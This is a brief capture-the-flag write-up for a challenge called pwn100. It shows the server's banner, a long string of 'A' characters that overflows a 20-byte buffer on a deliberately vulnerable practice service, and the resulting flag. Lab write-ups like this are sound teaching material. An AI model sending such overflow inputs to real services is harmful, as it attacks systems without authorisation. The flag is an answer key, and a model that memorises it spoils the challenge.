# pwn100

## Description
I heard pwn100 is pretty easy.

nc 3.238.30.178 3000

## Solve
In the terminal run `nc 3.238.30.178 3000` connecting to this ip gives us:
```
Welcome to pwn100! Your job is to overflow the vulnerable buffer to overwrite the challenge function's return address.

The program will now read 60 bytes into a 20 byte buffer at 0xffe163ec: 
```
If you input an extremely long input, such as
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
You will overflow the buffer, which then outputs the flag

## Flag
```
MCA{50dce13d1d6a937b6f0e211d090c7328f9f90ad3}
```